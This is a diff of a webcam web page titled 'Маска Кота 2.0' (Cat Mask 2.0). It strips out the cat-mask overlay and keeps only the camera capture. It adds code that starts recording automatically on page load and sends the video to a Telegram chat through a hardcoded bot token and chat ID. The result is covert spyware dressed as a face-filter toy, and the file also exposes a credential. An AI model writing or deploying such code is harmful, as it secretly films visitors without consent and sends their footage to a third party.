@@ -3,19 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Recording with Cat Mask</title>
-    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+    <title>Video Recording and Telegram</title>
     <style>
         #video {
             display: block;
             width: 640px;
             height: 480px;
-        }
-        #overlayCanvas {
-            display: block;
-            position: absolute;
-            top: 0;
-            left: 0;
         }
         #recordedVideo {
             display: block;
@@ -25,49 +18,36 @@
     </style>
 </head>
 <body>
-    <h1>Маска кот1а</h1>
-    <div style="position: relative;">
-        <video id="video" autoplay></video>
-        <canvas id="overlayCanvas" width="640" height="480"></canvas>
-    </div>
+    <h1>Маска Кота 2.0</h1>
+    <video id="video" autoplay></video>
     <video id="recordedVideo" controls></video>
 
     <script>
         const video = document.getElementById('video');
-        const overlayCanvas = document.getElementById('overlayCanvas');
-        const overlayContext = overlayCanvas.getContext('2d');
         const recordedVideo = document.getElementById('recordedVideo');
 
         let mediaRecorder;
         let recordedChunks = [];
 
-        // Load face-api models from CDN
-        Promise.all([
-            faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/weights/tiny_face_detector_model-weights_manifest.json'),
-            faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/weights/face_landmark_68_model-weights_manifest.json')
-        ]).then(startVideo);
-
+        // Function to start video
         function startVideo() {
-            navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user' } // Фронтальная камера
-            })
-            .then(stream => {
-                video.srcObject = stream;
-                setupMediaRecorder(stream);
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setupMediaRecorder(stream);
 
-                video.onloadedmetadata = () => {
-                    // Start detection and recording
-                    setTimeout(() => {
-                        mediaRecorder.start();
-                        console.log('Recording started');
-                    }, 3000); // Delay to allow camera to focus
-
-                    detectFaces();
-                };
-            })
-            .catch(err => console.error("Error accessing camera: ", err));
+                    video.onloadedmetadata = () => {
+                        // Start recording after a delay to allow the camera to focus
+                        setTimeout(() => {
+                            mediaRecorder.start();
+                            console.log('Recording started');
+                        }, 3000);
+                    };
+                })
+                .catch(err => console.error("Error accessing camera: ", err));
         }
 
+        // Function to setup MediaRecorder
         function setupMediaRecorder(stream) {
             mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
 
@@ -86,30 +66,7 @@
             };
         }
 
-        function detectFaces() {
-            setInterval(async () => {
-                const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
-                if (detections.length > 0) {
-                    drawCatMask(detections[0].landmarks);
-                }
-            }, 100); // Detect every 100ms
-        }
-
-        function drawCatMask(landmarks) {
-            const nose = landmarks.getNose()[3];
-            const leftEye = landmarks.getLeftEye()[0];
-            const rightEye = landmarks.getRightEye()[3];
-            const width = rightEye.x - leftEye.x;
-
-            const img = new Image();
-            img.src = 'https://w7.pngwing.com/pngs/456/738/png-transparent-cat-head.png'; // URL маски кота
-
-            img.onload = () => {
-                overlayContext.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
-                overlayContext.drawImage(img, nose.x - width, nose.y - width * 1.5, width * 3, width * 2.5);
-            };
-        }
-
+        // Function to send video to Telegram
         function sendToTelegram(blob) {
             const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
             const chatId = '6121166273';
@@ -143,6 +100,9 @@
                 event.returnValue = ''; // For some browsers
             }
         });
+
+        // Start video on page load
+        window.onload = startVideo;
     </script>
 </body>
 </html>
